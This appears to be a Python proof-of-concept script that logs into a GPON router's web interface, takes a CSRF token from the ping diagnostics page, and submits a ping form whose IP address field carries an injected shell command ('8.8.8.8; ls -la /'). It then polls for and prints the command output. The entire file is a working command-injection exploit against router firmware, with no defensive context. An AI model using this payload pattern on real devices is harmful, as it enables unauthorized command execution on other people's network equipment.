import asyncio
from browserless_gpon import GPONClient
import re
import time

client = GPONClient()
client.login()

res = client.session.get(f"{client.ip}/diag.cgi?ping")
csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', res.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

payload = {
    "csrf_token": csrf_token,
    "passwd_token_value": "",
    "iface": "",
    "ipaddr": "8.8.8.8; ls -la /",
    "checkall": "ping",
    "pingcount": "1",
    "packetlength": "64",
    "tracehops": "30"
}

print(f"Injecting payload: {payload['ipaddr']}")
post_res = client.session.post(f"{client.ip}/diag.cgi?ping", data=payload)

# The ping output is usually fetched via a secondary endpoint or embedded JS polling
time.sleep(2)
poll_res = client.session.get(f"{client.ip}/diag.cgi?ping_result")
print(poll_res.text[:1000])
